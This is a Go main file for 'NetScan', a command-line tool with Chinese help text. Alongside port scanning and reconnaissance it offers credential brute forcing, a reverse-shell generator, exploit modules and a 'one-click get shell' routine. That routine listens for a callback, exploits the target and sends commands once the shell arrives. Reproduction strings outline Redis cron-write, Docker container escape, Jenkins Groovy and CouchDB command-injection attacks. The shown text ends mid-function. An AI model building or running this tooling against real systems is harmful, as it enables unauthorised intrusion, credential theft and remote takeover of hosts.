package main

import (
	"encoding/json"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/term"

	"portscanner/internal/scanner"
)

var version = "dev"

type cliFlags struct {
	targets        string
	ports          string
	excludePorts   string
	sT, sS, sU     bool
	sF, sN, sX, sA bool
	timing         int
	skipDisc       bool
	discOnly       bool
	versionDet     bool
	osDetect       bool
	dns            bool
	rate           int
	randomize      bool
	verbose        bool
	outNormal      string
	outXML         string
	outGrepable    string
	outJSON        string
	outCSV         string
	sortBy         string
	pingOnly       bool
	banner         bool
	traceroute     bool
	trMax          int
	dirSearch      bool
	subBrute       bool
	whois          bool
	dnsRecords     bool
	webCheck       bool
	useHTTPS       bool
	proxy          string
	pluginMarket   string
	stopAfter      bool
	maxTargets     int
	poc            bool
	fingerprint    bool
	subDepth       int
	monitor        string
	interval       string
	forceRaw       bool
	outHTML        string
	brute          string
	userDict       string
	passDict       string
	bruteDelay     int
	bruteThreads   int
	shell          string
	lhost          string
	lport          int
	exploit        string
	exploitList    bool
	getShell       bool
	vulnReport     bool
	scanVuln       bool
	pocScan        bool
	sshShell       bool
	sshConnect     bool
	sshUser        string
	sshPass        string
	store          bool
	history        bool
	diff           bool
	showHelp       bool
	showVersion    bool
}

func main() {
	if dispatchSubcommand() {
		return
	}
	// 加载用户自定义模块(modules/ 目录, 平台化可替换)
	scanner.OpenModuleManager("").Load()
	var f cliFlags
	flag.StringVar(&f.targets, "target", "", "扫描目标(必填), 支持 IP/CIDR/范围/域名, 逗号分隔")
	flag.StringVar(&f.ports, "p", "1-65535", "端口表达式: 80 / 1-1000 / 22,80-90 / top-1000 / -(全部)")
	flag.StringVar(&f.excludePorts, "exclude-ports", "", "排除的端口表达式")
	flag.BoolVar(&f.sT, "sT", false, "TCP Connect 扫描")
	flag.BoolVar(&f.sS, "sS", false, "TCP SYN 半开扫描(需 root)")
	flag.BoolVar(&f.sU, "sU", false, "UDP 扫描")
	flag.BoolVar(&f.sF, "sF", false, "FIN 扫描")
	flag.BoolVar(&f.sN, "sN", false, "NULL 扫描")
	flag.BoolVar(&f.sX, "sX", false, "Xmas 扫描")
	flag.BoolVar(&f.sA, "sA", false, "ACK 扫描")
	flag.IntVar(&f.timing, "T", 3, "定时模板 0-5(0 最慢最隐蔽, 5 最快)")
	flag.BoolVar(&f.skipDisc, "Pn", false, "跳过主机发现")
	flag.BoolVar(&f.discOnly, "sn", false, "仅主机发现(不扫描端口)")
	flag.BoolVar(&f.versionDet, "sV", false, "服务与版本识别")
	flag.BoolVar(&f.osDetect, "O", false, "操作系统识别")
	flag.BoolVar(&f.dns, "dns", false, "启用反向 DNS 解析")
	flag.IntVar(&f.rate, "rate", 0, "每秒发包数限制(0=不限)")
	flag.BoolVar(&f.randomize, "randomize", false, "随机端口顺序")
	flag.BoolVar(&f.verbose, "v", false, "详细输出(含关闭/过滤端口)")
	flag.StringVar(&f.outNormal, "oN", "", "普通格式输出文件")
	flag.StringVar(&f.outXML, "oX", "", "XML 格式输出文件")
	flag.StringVar(&f.outGrepable, "oG", "", "grepable 格式输出文件")
	flag.StringVar(&f.outJSON, "oJ", "", "JSON 格式输出文件")
	flag.StringVar(&f.outCSV, "oC", "", "CSV 格式输出文件")
	flag.StringVar(&f.sortBy, "sort", "", "结果排序: port / host / state")
	flag.BoolVar(&f.pingOnly, "sp", false, "仅 ping 测延迟(不扫端口)")
	flag.BoolVar(&f.banner, "banner", false, "抓取开放端口的原始 banner")
	flag.BoolVar(&f.traceroute, "tr", false, "路由跟踪(traceroute)")
	flag.IntVar(&f.trMax, "tr-max", 30, "路由跟踪最大跳数")
	flag.BoolVar(&f.dirSearch, "dir", false, "目录/文件爆破(dirsearch)")
	flag.BoolVar(&f.subBrute, "sub", false, "子域名爆破")
	flag.BoolVar(&f.whois, "whois", false, "Whois 查询")
	flag.BoolVar(&f.dnsRecords, "dnsq", false, "DNS 记录查询")
	flag.BoolVar(&f.webCheck, "web", false, "HTTP 安全头检查")
	flag.BoolVar(&f.useHTTPS, "https", false, "使用 HTTPS(配合 -dir/-web)")
	flag.StringVar(&f.proxy, "proxy", "", "代理地址: socks5://127.0.0.1:1080 或 http://127.0.0.1:8080")
	flag.StringVar(&f.pluginMarket, "plugin-market", "", "插件市场远程地址(如 http://host:port)")
	flag.BoolVar(&f.stopAfter, "stop-after-host", false, "命中第一个存活主机/开放端口后立即停止")
	flag.IntVar(&f.maxTargets, "max-targets", 10000, "目标 IP 数量上限(防止误扫大网段)")
	flag.BoolVar(&f.poc, "poc", false, "高危端口未授权访问检测")
	flag.BoolVar(&f.fingerprint, "fp", false, "CMS/Web 指纹识别")
	flag.IntVar(&f.subDepth, "sub-depth", 1, "子域名爆破深度(1-3)")
	flag.StringVar(&f.monitor, "monitor", "", "定时扫描监控: 与上次结果比对输出差异")
	flag.StringVar(&f.interval, "interval", "", "监控间隔(如 24h, 1h30m), 留空则只执行一次")
	flag.BoolVar(&f.forceRaw, "force-raw", false, "强制使用 raw socket(覆盖 proot 安全降级)")
	flag.StringVar(&f.outHTML, "oH", "", "HTML 报告输出文件")
	flag.StringVar(&f.brute, "brute", "", "服务弱口令爆破: ftp/ssh/telnet/redis/smtp/mysql/postgresql")
	flag.StringVar(&f.userDict, "user-dict", "", "用户名字典文件(留空用内置字典)")
	flag.StringVar(&f.passDict, "pass-dict", "", "密码字典文件(留空用内置字典)")
	flag.IntVar(&f.bruteDelay, "brute-delay", 0, "爆破延迟(毫秒, 防封 IP)")
	flag.IntVar(&f.bruteThreads, "brute-threads", 10, "爆破线程数")
	flag.StringVar(&f.shell, "shell", "", "生成反弹 shell: bash/nc/python/php/perl/powershell 等")
	flag.StringVar(&f.lhost, "lhost", "", "反弹 shell 监听地址")
	flag.IntVar(&f.lport, "lport", 4444, "反弹 shell 监听端口")
	flag.StringVar(&f.exploit, "exploit", "", "漏洞利用: auto 或模块名(见 --exploit-list)")
	flag.BoolVar(&f.exploitList, "exploit-list", false, "列出所有利用模块")
	flag.BoolVar(&f.getShell, "get-shell", false, "一键拿 shell: 检测未授权→写 cron 反弹 shell→监听(需 --lhost)")
	flag.BoolVar(&f.vulnReport, "vuln-report", false, "输出所有可检测漏洞的名称与复现步骤")
	flag.BoolVar(&f.scanVuln, "scan-vuln", false, "针对目标扫描所有漏洞, 仅输出命中的漏洞+复现步骤")
	flag.BoolVar(&f.pocScan, "poc-scan", false, "批量扫描 Web POC 模板(内置+自定义), 命中生成漏洞报告")
	flag.BoolVar(&f.sshShell, "ssh-shell", false, "SSH 爆破成功后进入交互式 shell")
	flag.BoolVar(&f.sshConnect, "ssh-connect", false, "用 --ssh-user/--ssh-pass 直接建立交互式 SSH shell")
	flag.StringVar(&f.sshUser, "ssh-user", "", "SSH 用户名(配合 --ssh-connect)")
	flag.StringVar(&f.sshPass, "ssh-pass", "", "SSH 密码(配合 --ssh-connect)")
	flag.BoolVar(&f.store, "store", false, "保存扫描结果到资产库")
	flag.BoolVar(&f.history, "history", false, "查看目标历史扫描记录")
	flag.BoolVar(&f.diff, "diff", false, "与上次扫描结果对比")
	flag.BoolVar(&f.showHelp, "h", false, "显示帮助")
	flag.BoolVar(&f.showVersion, "version", false, "显示版本号")
	flag.Parse()

	// 插件市场远程地址
	if f.pluginMarket != "" {
		scanner.SetMarketURL(strings.TrimRight(f.pluginMarket, "/"))
	}

	if f.showVersion {
		fmt.Printf("NetScan %s\n", version)
		os.Exit(0)
	}

	if f.exploitList {
		for _, n := range scanner.ExploitList() {
			fmt.Println(n)
		}
		return
	}
	if f.vulnReport {
		fmt.Print(scanner.VulnReport())
		return
	}

	// 反弹 shell 生成(无需目标)
	if f.shell != "" {
		runShellGen(f)
		return
	}

	if f.showHelp || f.targets == "" {
		flag.Usage()
		os.Exit(1)
	}

	if f.scanVuln {
		runScanVuln(f)
		return
	}
	if f.pocScan {
		runPocScan(f)
		return
	}
	if f.brute != "" {
		runBrute(f)
		return
	}
	if f.exploit != "" {
		runExploit(f)
		return
	}
	if f.getShell {
		runGetShell(f)
		return
	}
	if f.sshConnect {
		runSSHConnect(f)
		return
	}
	if f.sshShell {
		runSSHShell(f)
		return
	}
	if f.history {
		runHistory(f)
		return
	}
	if f.traceroute {
		runTraceroute(f)
		return
	}
	if f.pingOnly {
		runPing(f)
		return
	}
	if f.dirSearch {
		runDirSearch(f)
		return
	}
	if f.subBrute {
		runSubBrute(f)
		return
	}
	if f.whois {
		runWhois(f)
		return
	}
	if f.dnsRecords {
		runDNSRecords(f)
		return
	}
	if f.webCheck {
		runWebCheck(f)
		return
	}
	if f.monitor != "" {
		runMonitor(f)
		return
	}

	opts := buildOptions(f)
	results, err := runScan(opts, f)
	if err != nil {
		fmt.Fprintf(os.Stderr, "错误: %v\n", err)
		os.Exit(1)
	}

	sortResults(results, f.sortBy)
	writeOutputs(f, results, opts)

	if f.banner {
		grabBanners(results)
	}

	if f.store {
		storeScan(f, results)
	}
	if f.diff {
		diffScan(f, results)
	}

	printSummary(results)
}

// storeScan 保存扫描结果到资产库
func storeScan(f cliFlags, results []scanner.Result) {
	target := strings.Join(splitList(f.targets), ",")
	s := scanner.OpenStore(scanner.DefaultStateDir())
	if err := s.Save(target, results); err != nil {
		fmt.Fprintf(os.Stderr, "保存失败: %v\n", err)
		return
	}
	fmt.Fprintf(os.Stderr, "已保存扫描结果到资产库(目标: %s)\n", target)
}

// diffScan 与上次扫描结果对比
func diffScan(f cliFlags, results []scanner.Result) {
	target := strings.Join(splitList(f.targets), ",")
	s := scanner.OpenStore(scanner.DefaultStateDir())
	added, removed, _ := s.Diff(target, results)
	for _, a := range added {
		fmt.Printf("+ 新增 %s:%d/%s %s\n", a.IP, a.Port, a.Protocol, a.Service)
	}
	for _, a := range removed {
		fmt.Printf("- 消失 %s:%d/%s %s\n", a.IP, a.Port, a.Protocol, a.Service)
	}
	if len(added) == 0 && len(removed) == 0 {
		fmt.Println("与上次扫描无变化")
	}
}

// runHistory 查看历史记录
func runHistory(f cliFlags) {
	target := strings.Join(splitList(f.targets), ",")
	s := scanner.OpenStore(scanner.DefaultStateDir())
	recs, err := s.History(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无历史记录: %v\n", err)
		return
	}
	for _, rec := range recs {
		fmt.Printf("=== %s (扫描时间 %s) ===\n", rec.Target, rec.Time.Format("2006-01-02 15:04:05"))
		for _, a := range rec.Assets {
			line := fmt.Sprintf("  %s:%-5d/%-3s %-20s", a.IP, a.Port, a.Protocol, a.Service)
			if a.Version != "" {
				line += " " + a.Version
			}
			if a.Vuln != "" {
				line += "  [!]" + a.Vuln
			}
			fmt.Println(line)
		}
	}
}

func buildOptions(f cliFlags) scanner.Options {
	opts := scanner.DefaultOptions()
	opts.Targets = splitList(f.targets)
	opts.Ports = f.ports
	opts.ExcludePorts = f.excludePorts
	opts.Timing = f.timing
	opts.Timeout = 0
	opts.Concurrency = 0
	opts.SkipDiscovery = f.skipDisc
	opts.DiscoveryOnly = f.discOnly
	opts.VersionDetect = f.versionDet
	opts.ServiceDetect = f.versionDet
	opts.OSDetect = f.osDetect
	opts.ResolveDNS = f.dns
	opts.Rate = f.rate
	opts.Randomize = f.randomize
	opts.Verbose = f.verbose
	opts.ProxyURL = f.proxy
	opts.StopAfterHost = f.stopAfter
	opts.MaxTargets = f.maxTargets
	opts.POC = f.poc
	opts.Fingerprint = f.fingerprint
	opts.ForceRaw = f.forceRaw

	var types []scanner.ScanType
	if f.sT {
		types = append(types, scanner.ScanTCPConnect)
	}
	if f.sS {
		types = append(types, scanner.ScanTCPSYN)
	}
	if f.sU {
		types = append(types, scanner.ScanUDP)
	}
	if f.sF {
		types = append(types, scanner.ScanFIN)
	}
	if f.sN {
		types = append(types, scanner.ScanNULL)
	}
	if f.sX {
		types = append(types, scanner.ScanXMAS)
	}
	if f.sA {
		types = append(types, scanner.ScanACK)
	}
	if len(types) > 0 {
		opts.ScanTypes = types
	}
	return opts
}

func runScan(opts scanner.Options, f cliFlags) ([]scanner.Result, error) {
	var mu sync.Mutex
	var results []scanner.Result

	start := time.Now()
	fmt.Fprintf(os.Stderr, "NetScan %s | 目标: %s | 端口: %s | 技术: %s\n", version, strings.Join(opts.Targets, ","), opts.Ports, scanTypeDesc(opts.ScanTypes))

	s := scanner.NewScanner(opts,
		func(r scanner.Result) {
			mu.Lock()
			results = append(results, r)
			mu.Unlock()
			printResult(r)
		},
		func(p scanner.Progress) {
			if p.Message != "" {
				fmt.Fprintf(os.Stderr, "\r%s — 主机 %d/%d, 端口 %d/%d (%.1f%%)      ",
					p.Message, p.ScannedHost, p.TotalHosts, p.ScannedPort, p.TotalHosts*p.TotalPorts, p.Percent)
			}
		},
	)

	err := s.Run()
	elapsed := time.Since(start)
	fmt.Fprintf(os.Stderr, "\n用时: %s\n", elapsed.Round(time.Millisecond))
	// 插件: notification 推送 / report 生成报告 / output 自定义输出
	pm := scanner.OpenPluginManager("")
	pm.Notify(results)
	for _, path := range pm.GenerateReports(strings.Join(opts.Targets, ","), opts.Ports, results) {
		fmt.Fprintf(os.Stderr, "[插件报告] 已生成: %s\n", path)
	}
	for name, text := range pm.RenderOutput(results) {
		fmt.Printf("\n===== 插件输出: %s =====\n%s", name, text)
	}
	return results, err
}

func printResult(r scanner.Result) {
	if r.State == "up" {
		fmt.Printf("%s\t主机存活\t延迟 %v\n", r.IP, r.Latency.Round(time.Millisecond))
		return
	}
	if r.State == "down" {
		fmt.Printf("%s\t主机离线\n", r.IP)
		return
	}
	if r.State == "os" {
		fmt.Printf("%s\t操作系统\t%s (%s)\n", r.IP, r.Version, r.OS)
		return
	}
	svc := r.Service
	if r.Version != "" {
		svc += " " + r.Version
	}
	host := r.IP
	if r.Hostname != "" {
		host += " (" + r.Hostname + ")"
	}
	fmt.Printf("%-24s %6d/%-3s %-13s %s\n", host, r.Port, r.Protocol, r.State, svc)
	if r.Vuln != "" {
		fmt.Printf("    [!] [高危] %s\n", r.Vuln)
	}
}

func scanTypeDesc(types []scanner.ScanType) string {
	names := make([]string, 0, len(types))
	for _, t := range types {
		names = append(names, string(t))
	}
	return strings.Join(names, ",")
}

// ---- 排序 ----

func sortResults(results []scanner.Result, by string) {
	switch strings.ToLower(by) {
	case "port":
		sort.SliceStable(results, func(i, j int) bool {
			if results[i].Port != results[j].Port {
				return results[i].Port < results[j].Port
			}
			return results[i].IP < results[j].IP
		})
	case "state":
		sort.SliceStable(results, func(i, j int) bool {
			if results[i].State != results[j].State {
				return results[i].State < results[j].State
			}
			return results[i].IP < results[j].IP
		})
	case "host":
		sort.SliceStable(results, func(i, j int) bool {
			if results[i].IP != results[j].IP {
				return results[i].IP < results[j].IP
			}
			return results[i].Port < results[j].Port
		})
	}
}

// ---- 统计摘要 ----

func printSummary(results []scanner.Result) {
	upHosts := map[string]bool{}
	openCount := 0
	serviceCount := map[string]int{}
	hostPorts := map[string]int{}
	for _, r := range results {
		switch r.State {
		case "up":
			upHosts[r.IP] = true
		case scanner.StateOpen:
			openCount++
			hostPorts[r.IP]++
			if r.Service != "" {
				serviceCount[r.Service]++
			}
		}
	}

	fmt.Fprintf(os.Stderr, "\n========== 扫描统计 ==========\n")
	fmt.Fprintf(os.Stderr, "发现存活主机: %d 台\n", len(upHosts))
	fmt.Fprintf(os.Stderr, "有开放端口主机: %d 台\n", len(hostPorts))
	fmt.Fprintf(os.Stderr, "开放端口: %d 个\n", openCount)

	if len(hostPorts) > 0 {
		fmt.Fprintf(os.Stderr, "按主机分布:\n")
		ips := make([]string, 0, len(hostPorts))
		for ip := range hostPorts {
			ips = append(ips, ip)
		}
		sort.Strings(ips)
		for _, ip := range ips {
			fmt.Fprintf(os.Stderr, "  %-16s %d 个开放端口\n", ip, hostPorts[ip])
		}
	}

	if len(serviceCount) > 0 {
		fmt.Fprintf(os.Stderr, "服务分布:\n")
		type svcCount struct {
			name  string
			count int
		}
		list := make([]svcCount, 0, len(serviceCount))
		for name, c := range serviceCount {
			list = append(list, svcCount{name, c})
		}
		sort.Slice(list, func(i, j int) bool { return list[i].count > list[j].count })
		for _, sc := range list {
			fmt.Fprintf(os.Stderr, "  %-20s %d\n", sc.name, sc.count)
		}
	}
	fmt.Fprintf(os.Stderr, "==============================\n")
}

// ---- Banner 抓取 ----

func grabBanners(results []scanner.Result) {
	fmt.Printf("\n========== Banner 抓取 ==========\n")
	for _, r := range results {
		if r.State != scanner.StateOpen || r.Protocol != "tcp" {
			continue
		}
		b := scanner.GrabBanner(r.IP, r.Port, 2*time.Second)
		if b == "" {
			continue
		}
		fmt.Printf("\n[%s:%d %s]\n%s\n", r.IP, r.Port, r.Service, strings.TrimSpace(b))
	}
}

// ---- Ping 模式 ----

func runPing(f cliFlags) {
	timeout := time.Second
	for _, t := range splitList(f.targets) {
		ip, err := resolveTarget(t)
		if err != nil {
			fmt.Printf("%s\t无法解析\n", t)
			continue
		}
		rtt, ok := scanner.PingAny(ip, timeout)
		if ok {
			fmt.Printf("%s\t存活\t延迟 %v\n", ip, rtt.Round(time.Millisecond))
		} else {
			fmt.Printf("%s\t不可达\n", ip)
		}
	}
}

// ---- 路由跟踪 ----

func runTraceroute(f cliFlags) {
	timeout := time.Second
	for _, t := range splitList(f.targets) {
		ip, err := resolveTarget(t)
		if err != nil {
			fmt.Printf("traceroute to %s: 无法解析\n", t)
			continue
		}
		fmt.Printf("traceroute to %s (%s), %d hops max\n", t, ip, f.trMax)
		scanner.TraceRoute(ip, f.trMax, timeout, func(hop int, addr string, rtt time.Duration) {
			if addr == "*" {
				fmt.Printf("%3d  *\n", hop)
			} else {
				fmt.Printf("%3d  %-16s %v\n", hop, addr, rtt.Round(time.Millisecond))
			}
		})
	}
}

func resolveTarget(s string) (string, error) {
	if ip := net.ParseIP(s); ip != nil {
		return s, nil
	}
	ips, err := net.LookupIP(s)
	if err != nil || len(ips) == 0 {
		return "", fmt.Errorf("无法解析 %s", s)
	}
	for _, ip := range ips {
		if v4 := ip.To4(); v4 != nil {
			return v4.String(), nil
		}
	}
	return ips[0].String(), nil
}

// ---- Web 侦察 ----

// firstPort 从端口表达式取第一个端口(用于单端口侦察模式), 无法解析时用默认值
func firstPort(spec string, def int) int {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return def
	}
	p := strings.SplitN(spec, ",", 2)[0]
	p = strings.SplitN(p, "-", 2)[0]
	p = strings.TrimPrefix(strings.TrimSpace(p), "top-")
	if n, err := strconv.Atoi(p); err == nil && n > 0 && n <= 65535 {
		return n
	}
	return def
}

func runDirSearch(f cliFlags) {
	target := splitList(f.targets)[0]
	host := strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://")
	host = strings.SplitN(host, "/", 2)[0]
	port := firstPort(f.ports, 80)
	fmt.Fprintf(os.Stderr, "目录爆破: %s:%d (%s)\n", host, port, schemeDesc(f.useHTTPS))
	scanner.DirSearch(host, port, f.useHTTPS, 30, 3*time.Second, func(path string, status int, size int64) {
		fmt.Printf("%-45s [%d] %d 字节\n", path, status, size)
	})
}

func runSubBrute(f cliFlags) {
	domain := splitList(f.targets)[0]
	fmt.Fprintf(os.Stderr, "子域名爆破: %s\n", domain)
	scanner.SubdomainBrute(domain, f.subDepth, 50, 3*time.Second, func(sub, ip string) {
		fmt.Printf("%-40s -> %s\n", sub, ip)
	})
}

func runWhois(f cliFlags) {
	domain := splitList(f.targets)[0]
	fmt.Fprintf(os.Stderr, "Whois: %s\n", domain)
	info, err := scanner.Whois(domain, 5*time.Second)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Whois 失败: %v\n", err)
		return
	}
	fmt.Println(info)
}

func runDNSRecords(f cliFlags) {
	domain := splitList(f.targets)[0]
	fmt.Fprintf(os.Stderr, "DNS 记录: %s\n", domain)
	records := scanner.DNSRecords(domain, 5*time.Second)
	order := []string{"A/AAAA", "CNAME", "MX", "NS", "TXT"}
	for _, typ := range order {
		if vals, ok := records[typ]; ok {
			for _, v := range vals {
				fmt.Printf("%-8s %s\n", typ, v)
			}
		}
	}
}

func runWebCheck(f cliFlags) {
	target := splitList(f.targets)[0]
	host := strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://")
	host = strings.SplitN(host, "/", 2)[0]
	port := firstPort(f.ports, 80)
	fmt.Fprintf(os.Stderr, "Web 头检查: %s:%d (%s)\n", host, port, schemeDesc(f.useHTTPS))
	headers, issues := scanner.WebHeaderCheck(host, port, f.useHTTPS, 5*time.Second)
	if headers == nil {
		fmt.Fprintf(os.Stderr, "无法连接到目标 Web 服务\n")
		return
	}
	fmt.Println("=== 响应头 ===")
	for k, v := range headers {
		fmt.Printf("  %s: %s\n", k, v)
	}
	if len(issues) > 0 {
		fmt.Println("=== 安全问题 ===")
		for _, issue := range issues {
			fmt.Printf("  [%s] %s\n", issue.Level, issue.Message)
		}
	}
}

func schemeDesc(https bool) string {
	if https {
		return "https"
	}
	return "http"
}

// ---- 漏洞利用 / 爆破 / 反弹 Shell ----

// runShellGen 生成反弹 shell 命令
func runShellGen(f cliFlags) {
	if f.lhost == "" {
		fmt.Fprintln(os.Stderr, "请用 --lhost 指定监听地址")
		os.Exit(1)
	}
	cmd := scanner.ReverseShell(f.shell, f.lhost, f.lport)
	if cmd == "" {
		fmt.Fprintf(os.Stderr, "不支持的 shell 类型: %s, 可用: %s\n", f.shell, strings.Join(scanner.ShellTypeList(), ", "))
		os.Exit(1)
	}
	fmt.Printf("反弹 shell (%s) -> %s:%d\n%s\n", f.shell, f.lhost, f.lport, cmd)
}

// runBrute 服务弱口令爆破
func runBrute(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 0)
	if port == 0 {
		// 根据服务类型取默认端口
		port = defaultServicePort(f.brute)
	}
	users := loadDict(f.userDict)
	passes := loadDict(f.passDict)
	fmt.Fprintf(os.Stderr, "爆破 %s://%s:%d (用户 %d 个, 密码 %d 个)\n", f.brute, ip, port, len(users), len(passes))

	scanner.BruteForce(ip, port, f.brute, users, passes, f.bruteThreads,
		time.Duration(f.bruteDelay)*time.Millisecond, 3*time.Second,
		func(r scanner.BruteResult) {
			fmt.Printf("[成功] %s://%s:%d  用户名: %s  密码: %s\n", r.Service, ip, port, r.Username, r.Password)
		})
}

// runExploit 漏洞利用
func runExploit(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 0)
	if port == 0 {
		port = defaultServicePort(f.exploit)
	}
	var result string
	if f.exploit == "auto" {
		result = scanner.AutoExploit(ip, port, "", 5*time.Second)
	} else {
		result = scanner.RunExploit(f.exploit, ip, port, 5*time.Second)
	}
	fmt.Printf("[利用] %s %s:%d\n%s\n", f.exploit, ip, port, result)
}

// shellVulnName 返回一键拿 shell 对应的漏洞名称
func shellVulnName(port int) string {
	switch port {
	case 6379:
		return "Redis 未授权访问(INFO 可执行, 可被写文件/提权)"
	case 2375, 2376:
		return "Docker API 未授权访问(可创建特权容器逃逸)"
	case 8080, 8090:
		return "Jenkins 未授权脚本控制台 RCE"
	case 5984:
		return "CouchDB 未授权访问(query_servers RCE)"
	default:
		return "未授权访问"
	}
}

// shellReproStep 返回一键拿 shell 的复现步骤
func shellReproStep(ip string, port int, lhost string, lport int) string {
	switch port {
	case 6379:
		return fmt.Sprintf("连接 %s:%d 发送 INFO 响应含 redis_version 即未授权; 再 CONFIG SET dir /var/spool/cron + SET 载荷 + SAVE 写入 cron 反弹 shell", ip, port)
	case 2375, 2376:
		return fmt.Sprintf("访问 http://%s:%d/version 响应含 ApiVersion 即未授权; 再创建特权容器挂载宿主根 / 到 /host, exec chroot /host 执行反弹 shell", ip, port)
	case 8080, 8090:
		return fmt.Sprintf("访问 http://%s:%d/script 可匿名访问即未授权; 再 POST Groovy ProcessBuilder 执行 bash 反弹 shell", ip, port)
	case 5984:
		return fmt.Sprintf("访问 http://%s:%d/_all_dbs 可读即未授权; 再 PUT /_config/query_servers 注入命令", ip, port)
	default:
		return ""
	}
}

// runPocScan 批量扫描 Web POC 模板并生成漏洞报告
func runPocScan(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 80)
	fmt.Fprintf(os.Stderr, "扫描 Web POC: %s:%d ...\n", ip, port)
	hits := scanner.ScanPOCs(ip, port, 3*time.Second)
	if len(hits) == 0 {
		fmt.Println("未命中任何 POC")
		return
	}
	fmt.Printf("\n命中 %d 个 POC:\n\n", len(hits))
	for _, h := range hits {
		fmt.Printf("● %s\n  复现步骤: %s\n\n", h.Name, h.Steps)
	}
}

// runScanVuln 针对目标扫描所有漏洞, 仅输出命中的漏洞+复现步骤
func runScanVuln(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 80)
	fmt.Fprintf(os.Stderr, "扫描漏洞: %s:%d ...\n", ip, port)
	hits := scanner.ScanVulns(ip, port, 3*time.Second)
	if len(hits) == 0 {
		fmt.Println("未发现漏洞")
		return
	}
	fmt.Printf("\n命中 %d 个漏洞:\n\n", len(hits))
	for _, h := range hits {
		fmt.Printf("● %s\n  复现步骤: %s\n\n", h.Name, h.Steps)
	}
}

// runSSHConnect 用指定凭据直接建立交互式 SSH shell
func runSSHConnect(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 22)
	if f.sshUser == "" || f.sshPass == "" {
		fmt.Fprintln(os.Stderr, "需指定 --ssh-user 和 --ssh-pass")
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "[*] 连接 SSH %s@%s:%d ...\n\n", f.sshUser, ip, port)
	restore := rawModeRestore()
	defer restore()
	if err := scanner.SSHInteractive(ip, port, f.sshUser, f.sshPass, 10*time.Second); err != nil {
		fmt.Fprintf(os.Stderr, "SSH 连接失败: %v\n", err)
		os.Exit(1)
	}
}

// runSSHShell 爆破 SSH 成功后进入交互式 shell
func runSSHShell(f cliFlags) {
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 22)
	users := loadDict(f.userDict)
	passes := loadDict(f.passDict)
	fmt.Fprintf(os.Stderr, "爆破 ssh://%s:%d (用户 %d, 密码 %d)...\n", ip, port, len(users), len(passes))
	user, pass, ok := scanner.BruteSSHOnce(ip, port, users, passes, f.bruteThreads, 3*time.Second)
	if !ok {
		fmt.Fprintln(os.Stderr, "爆破失败, 未找到凭据")
		os.Exit(1)
	}
	fmt.Printf("[成功] ssh://%s:%d  用户:%s 密码:%s\n\n", ip, port, user, pass)
	restore := rawModeRestore()
	defer restore()
	if err := scanner.SSHInteractive(ip, port, user, pass, 10*time.Second); err != nil {
		fmt.Fprintf(os.Stderr, "SSH 连接失败: %v\n", err)
		os.Exit(1)
	}
}

// rawModeRestore 进入 raw 模式(交互终端时), 返回恢复函数
func rawModeRestore() func() {
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		return func() {}
	}
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return func() {}
	}
	return func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }
}

// runGetShell 一键拿 shell: 检测未授权→写 cron 反弹 shell→监听并交互
func runGetShell(f cliFlags) {
	if f.lhost == "" {
		fmt.Fprintln(os.Stderr, "一键拿 shell 需指定 --lhost(回连地址)")
		os.Exit(1)
	}
	target := splitList(f.targets)[0]
	ip, err := resolveTarget(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
		os.Exit(1)
	}
	port := firstPort(f.ports, 0)
	if port == 0 {
		port = 6379
	}

	// 启动监听器
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", f.lport))
	if err != nil {
		fmt.Fprintf(os.Stderr, "监听 %d 失败: %v\n", f.lport, err)
		os.Exit(1)
	}
	defer ln.Close()
	fmt.Printf("[*] 监听 %d 等待反弹 shell...\n", f.lport)

	// 执行一键拿 shell(按服务自动选择利用链)
	result := scanner.GetShell(ip, port, f.lhost, f.lport, 5*time.Second)
	fmt.Printf("[利用] %s:%d\n%s\n", ip, port, result)
	fmt.Printf("[漏洞] %s\n", shellVulnName(port))
	fmt.Printf("[复现] %s\n", shellReproStep(ip, port, f.lhost, f.lport))
	if strings.HasPrefix(result, "目标") || strings.HasPrefix(result, "写入失败") || strings.HasPrefix(result, "连接失败") || strings.HasPrefix(result, "端口") {
		return
	}

	// 等待 shell 回连(默认 60 秒)
	ln.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
	conn, err := ln.Accept()
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-] 60 秒内未收到 shell 连接")
		return
	}
	defer conn.Close()
	fmt.Printf("[+] 收到反弹 shell: %s\n\n", conn.RemoteAddr())

	// 先发几条命令证明 RCE
	_, _ = conn.Write([]byte("rm -f /var/spool/cron/root; echo '=== RCE OK ==='; id; hostname; uname -a; whoami\n"))
	time.Sleep(400 * time.Millisecond) // 等 bash 启动并执行命令
